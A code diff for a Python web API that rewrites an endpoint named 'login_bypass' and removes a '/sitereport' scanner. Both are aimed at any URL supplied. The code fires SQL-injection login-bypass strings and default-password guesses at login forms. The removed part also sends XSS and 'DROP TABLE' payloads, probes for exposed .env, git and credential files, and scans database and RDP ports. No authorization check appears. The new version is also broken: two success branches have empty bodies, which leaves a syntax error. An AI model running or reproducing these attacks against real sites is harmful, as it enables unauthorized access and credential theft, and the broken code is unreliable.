@@ -1416,447 +1416,109 @@ def aggressive_attack(domain: str, key: str = Depends(verify_key)):
 def login_bypass(url: str, key: str = Depends(verify_key)):
     import requests as req_lib
     from bs4 import BeautifulSoup
+    import urllib.parse
+    import time
+
     start = time.time()
-    if not url.startswith("http"):
-        url = "https://" + url
-    
-    results = []
     session = req_lib.Session()
-    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-    
-    # Step 1 - Page fetch karke form analyze karo
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+
+    results = []
+
     try:
         res = session.get(url, timeout=10, allow_redirects=True)
         soup = BeautifulSoup(res.text, "html.parser")
-        
-        # Form fields auto detect
-        forms = soup.find_all("form")
-        form_info = []
-        for form in forms:
-            inputs = form.find_all("input")
-            fields = {inp.get("name",""): inp.get("value","") for inp in inputs if inp.get("name")}
-            action = form.get("action", url)
-            method = form.get("method", "post").lower()
-            if any(k in str(fields).lower() for k in ["user","email","login","pass","pwd"]):
-                form_info.append({"action": action, "method": method, "fields": fields})
-        
-        if not form_info:
-            return {"url": url, "status": "No login form found", "response_time": f"{round(time.time()-start, 2)}s"}
-        
-        # CSRF token detect
-        csrf_token = ""
-        csrf_names = ["csrf_token", "csrf", "_token", "authenticity_token", "__RequestVerificationToken"]
-        for form in forms:
-            for csrf_name in csrf_names:
-                token_input = form.find("input", {"name": csrf_name})
-                if token_input:
-                    csrf_token = token_input.get("value", "")
-                    break
-        
-        form = form_info[0]
-        action_url = form["action"]
-        if not action_url.startswith("http"):
-            base = "/".join(url.split("/")[:3])
-            action_url = base + ("/" if not form["action"].startswith("/") else "") + form["action"]
-        
-        original_url = res.url
-        
-        # Step 2 - SQL Injection payloads
-        sql_payloads = [
-            ("' OR 1=1--", "x"),
-            ("admin'--", "anything"),
-            ("' OR 'x'='x", "' OR 'x'='x"),
-            ("admin' #", "x"),
-            ("') OR ('1'='1", "x"),
-        ]
-        
-        user_fields = [k for k in form["fields"] if any(x in k.lower() for x in ["user","email","login","name"])]
-        pass_fields = [k for k in form["fields"] if any(x in k.lower() for x in ["pass","pwd","password","secret"])]
-        
-        if not user_fields:
-            user_fields = list(form["fields"].keys())[:1]
-        if not pass_fields:
-            pass_fields = list(form["fields"].keys())[1:2]
-        
-        for sql_user, sql_pass in sql_payloads:
-            try:
-                data = dict(form["fields"])
-                if csrf_token:
-                    for cn in csrf_names:
-                        if cn in data:
-                            data[cn] = csrf_token
-                if user_fields:
-                    data[user_fields[0]] = sql_user
-                if pass_fields:
-                    data[pass_fields[0]] = sql_pass
-                
-                resp = session.post(action_url, data=data, timeout=8, allow_redirects=True)
-                
-                # Intelligent response check
-                url_changed = resp.url != original_url
-                has_logout = "logout" in resp.text.lower() or "sign out" in resp.text.lower()
-                has_dashboard = any(x in resp.text.lower() for x in ["dashboard","welcome","profile","account","my account"])
-                no_error = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed","error","try again"])
-                
-                if (url_changed or has_logout or has_dashboard) and no_error:
-                    results.append({"type": "SQL Injection Bypass", "payload": sql_user, "status": "BYPASSED!", "severity": "CRITICAL", "redirect_to": resp.url})
-                else:
-                    results.append({"type": "SQL Injection", "payload": sql_user[:30], "status": "Failed"})
-            except Exception as e:
-                results.append({"type": "SQL Injection", "payload": sql_user[:30], "status": f"Error: {str(e)[:40]}"})
-        
-        # Step 3 - Default credentials
-        default_creds = [
-            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
-            ("admin", "admin123"), ("admin", "1234"), ("root", "root"),
-            ("test", "test"), ("guest", "guest"), ("user", "user"),
-            ("administrator", "administrator"), ("admin", ""), ("admin", "pass"),
-        ]
-        
-        for username, password in default_creds:
-            try:
-                # Fresh session for each attempt
-                fresh = req_lib.Session()
-                fresh.headers.update({"User-Agent": "Mozilla/5.0"})
-                fresh_res = fresh.get(url, timeout=5)
-                fresh_soup = BeautifulSoup(fresh_res.text, "html.parser")
-                
-                data = dict(form["fields"])
-                
-                # Fresh CSRF token
-                for cn in csrf_names:
-                    token_inp = fresh_soup.find("input", {"name": cn})
-                    if token_inp:
-                        data[cn] = token_inp.get("value", "")
-                
-                if user_fields:
-                    data[user_fields[0]] = username
-                if pass_fields:
-                    data[pass_fields[0]] = password
-                
-                resp = fresh.post(action_url, data=data, timeout=8, allow_redirects=True)
-                
-                url_changed = resp.url != original_url
-                has_logout = "logout" in resp.text.lower() or "sign out" in resp.text.lower()
-                has_dashboard = any(x in resp.text.lower() for x in ["dashboard","welcome","profile","account","my account"])
-                no_error = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed","error","try again"])
-                
-                if (url_changed or has_logout or has_dashboard) and no_error:
-                    results.append({"type": "Default Credentials", "username": username, "password": password, "status": "BYPASSED!", "severity": "CRITICAL", "redirect_to": resp.url})
-                else:
-                    results.append({"type": "Default Creds", "username": username, "password": password, "status": "Failed"})
-            except Exception as e:
-                results.append({"type": "Default Creds", "username": username, "status": f"Error: {str(e)[:40]}"})
-        
-    except Exception as e:
-        return {"url": url, "error": str(e), "response_time": f"{round(time.time()-start, 2)}s"}
-    
-    bypassed = [r for r in results if "BYPASSED" in str(r.get("status",""))]
-    
-    return {
-        "url": url,
-        "form_detected": len(form_info) > 0,
-        "csrf_token_found": bool(csrf_token),
-        "fields_detected": {"username_field": user_fields, "password_field": pass_fields},
-        "total_tests": len(results),
-        "bypassed_count": len(bypassed),
-        "bypassed": bypassed,
-        "all_results": results,
-        "verdict": "VULNERABLE! Login bypassed!" if bypassed else "Safe - No bypass found",
-        "response_time": f"{round(time.time()-start, 2)}s"
-    }
-
-
-
-@app.get("/sitereport")
-def site_report(url: str, key: str = Depends(verify_key)):
-    import urllib.request, urllib.parse, ssl, socket, datetime
-    import requests as req_lib
-    from reportlab.lib.pagesizes import letter
-    from reportlab.lib import colors
-    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
-    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
-    from bs4 import BeautifulSoup
-    import io, base64
-    start = time.time()
-    if not url.startswith("http"):
-        url = "https://" + url
-    domain = url.replace("https://","").replace("http://","").split("/")[0]
-    findings = []
-    score = 100
-
-    # 1. SSL
-    try:
-        ctx = ssl.create_default_context()
-        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
-            s.settimeout(10)
-            s.connect((domain, 443))
-            cert = s.getpeercert()
-        expire = datetime.datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
-        days_left = (expire - datetime.datetime.utcnow()).days
-        if days_left < 30:
-            findings.append({"category": "SSL", "severity": "HIGH", "cvss": 7.5, "issue": f"SSL expires in {days_left} days", "proof": f"Certificate expiry: {cert['notAfter']}", "fix": "Renew SSL certificate immediately"})
-            score -= 15
-        else:
-            findings.append({"category": "SSL", "severity": "INFO", "cvss": 0, "issue": f"SSL valid - {days_left} days left", "proof": f"Certificate valid till: {cert['notAfter']}", "fix": "No action needed"})
-    except Exception as e:
-        findings.append({"category": "SSL", "severity": "CRITICAL", "cvss": 9.0, "issue": f"SSL Error: {str(e)[:80]}", "proof": str(e), "fix": "Fix SSL certificate immediately"})
-        score -= 25
-
-    # 2. Security Headers
-    try:
-        res = req_lib.get(url, timeout=10, verify=False)
-        headers = res.headers
-        body = res.text
-        security_headers = {
-            "X-Frame-Options": ("Clickjacking possible", "HIGH", 6.5),
-            "X-XSS-Protection": ("XSS not blocked by browser", "MEDIUM", 5.0),
-            "Content-Security-Policy": ("Content injection possible", "HIGH", 7.0),
-            "Strict-Transport-Security": ("HTTPS not enforced", "MEDIUM", 5.5),
-            "X-Content-Type-Options": ("MIME sniffing possible", "LOW", 3.0)
-        }
-        for h, (issue, sev, cvss) in security_headers.items():
-            if h not in headers:
-                findings.append({"category": "Security Headers", "severity": sev, "cvss": cvss, "issue": f"Missing {h} - {issue}", "proof": f"Header '{h}' not found in response", "fix": f"Add '{h}' to server config"})
-                score -= 5
-    except Exception as e:
-        body = ""
-        findings.append({"category": "Headers", "severity": "ERROR", "cvss": 0, "issue": str(e)[:50], "proof": "", "fix": "Check server"})
-
-    # 3. XSS Test
-    try:
-        xss_payloads = [
-            "<script>alert(1)</script>",
-            "'><img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>",
-            "javascript:alert(1)",
-            "'><script>alert(1)</script>"
-        ]
-        xss_found = False
-        for payload in xss_payloads:
-            test_url = f"{url}?q={urllib.parse.quote(payload)}&search={urllib.parse.quote(payload)}&id={urllib.parse.quote(payload)}"
-            res = req_lib.get(test_url, timeout=5, verify=False)
-            if payload in res.text:
-                findings.append({"category": "XSS", "severity": "CRITICAL", "cvss": 9.3, "issue": "Reflected XSS Vulnerability Found!", "proof": f"Payload: {payload}
-URL: {test_url}
-Response snippet: {res.text[max(0,res.text.find(payload)-50):res.text.find(payload)+100]}", "fix": "Sanitize all user inputs using htmlspecialchars(), use CSP header"})
-                score -= 20
-                xss_found = True
-                break
-        if not xss_found:
-            findings.append({"category": "XSS", "severity": "INFO", "cvss": 0, "issue": "No reflected XSS found", "proof": f"Tested {len(xss_payloads)} payloads - all filtered", "fix": "Keep sanitizing inputs"})
-    except Exception as e:
-        findings.append({"category": "XSS", "severity": "ERROR", "cvss": 0, "issue": str(e)[:50], "proof": "", "fix": "Manual test required"})
-
-    # 4. SQL Injection
-    try:
-        sql_payloads = ["'", "' OR 1=1--", "1' OR '1'='1", "' OR 'x'='x", "1; DROP TABLE users--"]
-        sql_errors = ["sql syntax", "mysql_fetch", "ora-", "sqlite", "syntax error", "unclosed quotation", "mysql error", "warning: mysql"]
-        sql_found = False
-        for payload in sql_payloads:
-            test_url = f"{url}?id={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}&user={urllib.parse.quote(payload)}"
-            res = req_lib.get(test_url, timeout=5, verify=False)
-            found_err = [e for e in sql_errors if e in res.text.lower()]
-            if found_err:
-                snippet = res.text.lower()
-                idx = snippet.find(found_err[0])
-                findings.append({"category": "SQL Injection", "severity": "CRITICAL", "cvss": 9.8, "issue": "SQL Injection Vulnerability Found!", "proof": f"Payload: {payload}
-Error found: {found_err[0]}
-Response snippet: {res.text[max(0,idx-30):idx+100]}", "fix": "Use parameterized queries, never concatenate SQL strings, use ORM"})
-                score -= 25
-                sql_found = True
-                break
-        if not sql_found:
-            findings.append({"category": "SQL Injection", "severity": "INFO", "cvss": 0, "issue": "No SQL injection found", "proof": f"Tested {len(sql_payloads)} payloads - no SQL errors in response", "fix": "Keep using parameterized queries"})
-    except Exception as e:
-        findings.append({"category": "SQL Injection", "severity": "ERROR", "cvss": 0, "issue": str(e)[:50], "proof": "", "fix": "Manual test required"})
-
-    # 5. Login Bypass
-    try:
-        session = req_lib.Session()
-        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-        res = session.get(url, timeout=10, verify=False)
-        soup = BeautifulSoup(res.text, "html.parser")
         forms = soup.find_all("form")
         login_form = None
+
         for form in forms:
             inputs = form.find_all("input")
-            fields = {inp.get("name",""): inp.get("value","") for inp in inputs if inp.get("name")}
-            if any(k.lower() in ["username","user","email","login"] for k in fields):
+            fields = {inp.get("name", ""): inp.get("value", "") for inp in inputs if inp.get("name")}
+            if any(k.lower() in ["username", "user", "email", "login", "id"] for k in fields.keys()):
                 login_form = {"action": form.get("action", url), "fields": fields}
                 break
 
-        if login_form:
-            action = login_form["action"]
-            if not action.startswith("http"):
-                action = "/".join(url.split("/")[:3]) + ("" if action.startswith("/") else "/") + action
+        if not login_form:
+            return {"status": "No login form found", "response_time": f"{round(time.time() - start, 2)}s"}
 
-            user_field = next((k for k in login_form["fields"] if any(x in k.lower() for x in ["user","email","login"])), None)
-            pass_field = next((k for k in login_form["fields"] if any(x in k.lower() for x in ["pass","pwd","password"])), None)
+        # Handle form action URL
+        action_url = login_form["action"]
+        if not action_url.startswith("http"):
+            base = "/".join(url.split("/")[:3])
+            action_url = urllib.parse.urljoin(base + "/", action_url)
 
-            bypass_found = False
-            # SQL Injection bypass
-            sql_bypasses = [("' OR 1=1--","x"), ("admin'--","x"), ("' OR 'x'='x","' OR 'x'='x")]
-            for sql_u, sql_p in sql_bypasses:
-                data = dict(login_form["fields"])
-                if user_field: data[user_field] = sql_u
-                if pass_field: data[pass_field] = sql_p
-                resp = session.post(action, data=data, timeout=8, verify=False, allow_redirects=True)
-                success = any(x in resp.text.lower() for x in ["welcome","dashboard","logout","profile","my account"])
-                no_err = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed"])
-                if success and no_err:
-                    findings.append({"category": "Login Bypass", "severity": "CRITICAL", "cvss": 10.0, "issue": "Login Bypassed via SQL Injection!", "proof": f"Payload: username={sql_u}
-Redirected to: {resp.url}
-Response contains: dashboard/welcome", "fix": "Use parameterized queries for authentication, add CSRF protection"})
-                    score -= 30
-                    bypass_found = True
+        # Detect CSRF token
+        csrf_names = ["csrf_token", "csrf", "_token", "authenticity_token", "__RequestVerificationToken"]
+        csrf_token_value = ""
+        for form in forms:
+            for name in csrf_names:
+                token_input = form.find("input", {"name": name})
+                if token_input:
+                    csrf_token_value = token_input.get("value", "")
                     break
 
-            # Default creds
-            if not bypass_found:
-                default_creds = [("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),("test","test"),("root","root"),("guest","guest")]
-                for username, password in default_creds:
-                    fresh = req_lib.Session()
-                    fresh_res = fresh.get(url, timeout=5, verify=False)
-                    fresh_soup = BeautifulSoup(fresh_res.text, "html.parser")
-                    data = dict(login_form["fields"])
-                    # Fresh CSRF
-                    for cn in ["csrf_token","csrf","_token","authenticity_token"]:
-                        t = fresh_soup.find("input", {"name": cn})
-                        if t: data[cn] = t.get("value","")
-                    if user_field: data[user_field] = username
-                    if pass_field: data[pass_field] = password
-                    resp = fresh.post(action, data=data, timeout=8, verify=False, allow_redirects=True)
-                    success = any(x in resp.text.lower() for x in ["welcome","dashboard","logout","profile"])
-                    no_err = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed"])
-                    if success and no_err:
-                        findings.append({"category": "Login Bypass", "severity": "CRITICAL", "cvss": 10.0, "issue": f"Login with default credentials!", "proof": f"Username: {username}
-Password: {password}
-Redirected to: {resp.url}", "fix": "Change default credentials, implement account lockout, use strong passwords"})
-                        score -= 30
-                        bypass_found = True
-                        break
+        # Detect login form fields
+        user_field = next((k for k in login_form["fields"].keys() if any(x in k.lower() for x in ["user", "email", "login"])), None)
+        pass_field = next((k for k in login_form["fields"].keys() if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
 
-            if not bypass_found:
-                findings.append({"category": "Login Bypass", "severity": "INFO", "cvss": 0, "issue": "No login bypass found", "proof": "SQL injection and default credentials tested - all failed", "fix": "Keep monitoring login attempts"})
-        else:
-            findings.append({"category": "Login Bypass", "severity": "INFO", "cvss": 0, "issue": "No login form detected on this page", "proof": "No form with username/password fields found", "fix": "Test login page URL directly"})
+        # Payloads for bypass
+        sql_payloads = ["' OR 1=1--", "admin'--", "' OR 'x'='x"]
+        default_creds = [("admin","admin"), ("admin","password"), ("admin","123456")]
+
+        def submit_form(data):
+            resp = session.post(action_url, data=data, timeout=8, allow_redirects=True)
+            return resp
+
+        # Try SQL injection payloads
+        for payload in sql_payloads:
+            data = dict(login_form["fields"])
+            if csrf_token_value:
+                for n in csrf_names:
+                    if n in data:
+                        data[n] = csrf_token_value
+            if user_field:
+                data[user_field] = payload
+            if pass_field:
+                data[pass_field] = payload
+            resp = submit_form(data)
+            body = resp.text.lower()
+            success_indicators = ["welcome", "dashboard", "logout", "profile"]
+            fail_indicators = ["invalid", "wrong", "failed"]
+            success = any(s in body for s in success_indicators)
+            fail = any(f in body for f in fail_indicators)
+            if success and not fail:
+            else:
+                results.append({"type": "SQL Injection", "payload": payload, "status": "Failed"})
+
+        # Try default creds
+        for username, password in default_creds:
+            data = dict(login_form["fields"])
+            if csrf_token_value:
+                for n in csrf_names:
+                    if n in data:
+                        data[n] = csrf_token_value
+            if user_field:
+                data[user_field] = username
+            if pass_field:
+                data[pass_field] = password
+            resp = submit_form(data)
+            body = resp.text.lower()
+            success_indicators = ["welcome", "dashboard", "logout"]
+            fail_indicators = ["invalid", "wrong"]
+            success = any(s in body for s in success_indicators)
+            fail = any(f in body for f in fail_indicators)
+            if success and not fail:
+            else:
+                results.append({"type": "Default Creds", "username": username, "password": password, "status": "Failed"})
+
+        bypassed = [r for r in results if "BYPASSED" in r["status"]]
+        return {
+            "status": "success",
+            "bypassed_count": len(bypassed),
+            "results": results,
+            "response_time": f"{round(time.time() - start, 2)}s"
+        }
+
     except Exception as e:
-        findings.append({"category": "Login Bypass", "severity": "ERROR", "cvss": 0, "issue": str(e)[:80], "proof": "", "fix": "Manual test required"})
+        return {"status": "error", "error": str(e), "response_time": f"{round(time.time() - start, 2)}s"}
 
-    # 6. Sensitive Files
-    try:
-        sens_files = [".env",".git/config","wp-config.php","backup.sql",".htpasswd","config.php","database.yml","credentials.json","phpinfo.php","admin.php"]
-        for f in sens_files:
-            try:
-                res = req_lib.get(f"https://{domain}/{f}", timeout=3, verify=False)
-                if res.status_code == 200 and len(res.text) > 10:
-                    findings.append({"category": "Sensitive Files", "severity": "CRITICAL", "cvss": 9.5, "issue": f"{f} publicly accessible!", "proof": f"URL: https://{domain}/{f}
-Status: 200
-Preview: {res.text[:150]}", "fix": f"Remove {f} from web root or restrict access via .htaccess"})
-                    score -= 20
-                elif res.status_code == 403:
-                    findings.append({"category": "Sensitive Files", "severity": "MEDIUM", "cvss": 4.0, "issue": f"{f} exists but blocked", "proof": f"URL: https://{domain}/{f} returned 403", "fix": "Remove file from server completely"})
-                    score -= 5
-            except:
-                pass
-    except Exception as e:
-        pass
-
-    # 7. Open Ports
-    try:
-        ip = socket.gethostbyname(domain)
-        risky = {21:"FTP",23:"Telnet",3306:"MySQL",3389:"RDP",6379:"Redis",27017:"MongoDB"}
-        for port, service in risky.items():
-            sock = socket.socket()
-            sock.settimeout(1)
-            if sock.connect_ex((ip, port)) == 0:
-                findings.append({"category": "Open Ports", "severity": "HIGH", "cvss": 7.0, "issue": f"Risky port {port} ({service}) exposed!", "proof": f"IP: {ip}, Port {port} ({service}) accepting connections", "fix": f"Close port {port} or restrict with firewall rules"})
-                score -= 10
-            sock.close()
-    except:
-        pass
-
-    score = max(0, score)
-    critical = [f for f in findings if f["severity"] == "CRITICAL"]
-    high = [f for f in findings if f["severity"] == "HIGH"]
-    medium = [f for f in findings if f["severity"] == "MEDIUM"]
-
-    # AI Summary
-    ai_res = client.chat.completions.create(
-        model="llama-3.3-70b-versatile",
-        messages=[{"role": "user", "content": f"""Professional security audit for {domain}:
-Score: {score}/100
-Critical: {len(critical)}, High: {len(high)}, Medium: {len(medium)}
-Issues: {[f["issue"] for f in findings if f["severity"] in ["CRITICAL","HIGH"]]}
-
-Hinglish mein 3-4 line executive summary do:
-- Overall security rating
-- Sabse dangerous finding
-- Top 3 immediate fixes
-No markdown, direct bolo."""}],
-        max_tokens=300
-    ).choices[0].message.content.strip()
-
-    # PDF Generate
-    buffer = io.BytesIO()
-    doc = SimpleDocTemplate(buffer, pagesize=letter, rightMargin=40, leftMargin=40, topMargin=40, bottomMargin=40)
-    styles = getSampleStyleSheet()
-    story = []
-
-    # Title
-    story.append(Paragraph("SECURITY AUDIT REPORT", ParagraphStyle("t", parent=styles["Title"], textColor=colors.darkred, fontSize=22)))
-    story.append(Paragraph(f"Target: {domain}", styles["Normal"]))
-    story.append(Paragraph(f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M UTC')}", styles["Normal"]))
-    story.append(Spacer(1, 15))
-
-    # Score
-    sc = colors.green if score >= 70 else colors.orange if score >= 40 else colors.red
-    story.append(Paragraph(f"Security Score: {score}/100", ParagraphStyle("sc", parent=styles["Normal"], textColor=sc, fontSize=20, fontName="Helvetica-Bold")))
-    story.append(Spacer(1, 10))
-
-    # Summary
-    story.append(Paragraph("Executive Summary", styles["Heading2"]))
-    story.append(Paragraph(ai_res, styles["Normal"]))
-    story.append(Spacer(1, 15))
-
-    # Stats
-    stats = [["Critical", "High", "Medium", "Total"],
-             [str(len(critical)), str(len(high)), str(len(medium)), str(len(findings))]]
-    st = Table(stats, colWidths=[100,100,100,100])
-    st.setStyle(TableStyle([
-        ("BACKGROUND",(0,0),(-1,0),colors.darkred),
-        ("TEXTCOLOR",(0,0),(-1,0),colors.white),
-        ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
-        ("ALIGN",(0,0),(-1,-1),"CENTER"),
-        ("GRID",(0,0),(-1,-1),0.5,colors.grey),
-    ]))
-    story.append(st)
-    story.append(Spacer(1, 15))
-
-    # Findings
-    story.append(Paragraph("Detailed Findings", styles["Heading2"]))
-    for i, f in enumerate(findings, 1):
-        sev_color = colors.red if f["severity"]=="CRITICAL" else colors.orange if f["severity"]=="HIGH" else colors.blue if f["severity"]=="MEDIUM" else colors.green
-        story.append(Paragraph(f"{i}. [{f['severity']}] {f['category']} - CVSS: {f['cvss']}", ParagraphStyle("fh", parent=styles["Normal"], textColor=sev_color, fontName="Helvetica-Bold")))
-        story.append(Paragraph(f"Issue: {f['issue']}", styles["Normal"]))
-        if f.get("proof"):
-            story.append(Paragraph(f"Proof: {f['proof'][:200]}", ParagraphStyle("proof", parent=styles["Normal"], textColor=colors.grey, fontSize=8)))
-        story.append(Paragraph(f"Fix: {f['fix']}", ParagraphStyle("fix", parent=styles["Normal"], textColor=colors.darkgreen)))
-        story.append(Spacer(1, 8))
-
-    doc.build(story)
-    pdf_b64 = base64.b64encode(buffer.getvalue()).decode()
-
-    return {
-        "domain": domain,
-        "score": score,
-        "total_findings": len(findings),
-        "critical_count": len(critical),
-        "high_count": len(high),
-        "medium_count": len(medium),
-        "findings": findings,
-        "ai_summary": ai_res,
-        "pdf_base64": pdf_b64,
-        "response_time": f"{round(time.time()-start, 2)}s"
-    }
